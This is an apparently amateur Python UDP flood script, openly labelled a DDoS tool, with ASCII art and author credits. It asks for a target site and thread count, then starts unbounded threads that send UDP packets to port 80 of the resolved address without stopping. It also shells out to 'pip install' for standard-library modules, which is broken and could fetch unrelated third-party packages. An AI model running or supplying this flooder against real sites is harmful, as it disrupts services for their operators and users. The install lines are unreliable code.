import os
import sys
os.system("pip install time")
os.system("pip install socket")
os.system("pip install _thread")
import time
import socket
import _thread

print(f'\033[31m')
from time import sleep
x = ("""
	 
───────────────────██
──────────────────█─██
──────────────────█───█
──────────────────█───█
──────────────────█───█
──────────────────█───█
──────────────────█───█▓               SHAHIN AND AMIR
──────────────────█───▓█                 SKRIPT DDOS
──────────────────█───░█             I LOVE YOU KOSAR.MN
──────────────────█───░█
──────────────────█░░░─█
───────────▓███──██▓▓███
───────────██──▓██▓────██
───────────█▓────█▓─────▓█
───────────█▓─────█──────░█
██████─────█▓─────█────────█
████████▓███░──────█──█▓────█
█░░░░░░█───────────█░███────█▓
▓██████─────────────█▓██────██
███████░────────────────────▓█
▓██████░────────────────────░█
▓██████░────────────────────▓█
▓██████░────────────────────█▓
▓██████░────────────────────█
▓██████░───────────────────██
▓███░██░──────────────────█
▓███──████████████████████
██████

		""")
for CoursNight in x :
	sleep(0.002)
	print(CoursNight,end='' ,flush=True)


x = '\033[31m'
print(x,'ddos = GHOGHNOS_BLACK and shahin god',x)
print(f'\033[39m')
site = input("Enter your site url => ")
thread_count = input("Enter your thread => ")
ip = socket.gethostbyname(site)
UDP_PORT = 80
MESSAGE = 'virus32'
print("UDP target IP:", ip)
print("UDP target port:", UDP_PORT)
time.sleep(3)
def ddos(i):
    while 1:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
        print(f'\033[32m')
        print("Packet Sent = god is ddos = GHOGHNOS_BLACK and shahin god")
for i in range(int(thread_count)):
    try:
        _thread.start_new_thread(ddos, ("Thread-" + str(i),))
    except KeyboardInterrupt:
        sys.exit(0)
while 1:
    pass